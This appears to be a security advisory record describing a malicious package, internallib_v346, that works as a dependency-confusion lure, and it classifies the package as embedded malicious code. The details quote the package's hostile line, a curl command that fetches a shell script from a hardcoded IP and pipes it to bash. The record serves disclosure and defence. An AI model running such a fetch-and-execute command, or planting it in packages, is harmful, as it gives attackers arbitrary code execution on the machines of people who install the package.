summary: Dependency-confusion lure executes remote shell script via curl|bash
details: internallib_v346@1.1.1 exports a single function `command()` in index.js that runs `exec('curl http://10.0.56.229:8000/shell.sh | bash')`, fetching an unauthenticated shell script from a hardcoded RFC1918 IP over plaintext HTTP and piping it to bash. The package metadata is empty (no author, no description, default license) and the name pattern (`internallib_v346`) is consistent with a dependency-confusion lure intended to shadow a private internal package of the same name on a victim's registry. Any consumer that installs this package and invokes the exported API receives arbitrary attacker-controlled code execution. A Portuguese log string in the same function ("Downloading and executing the shell from my machine...") confirms deliberate dropper intent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
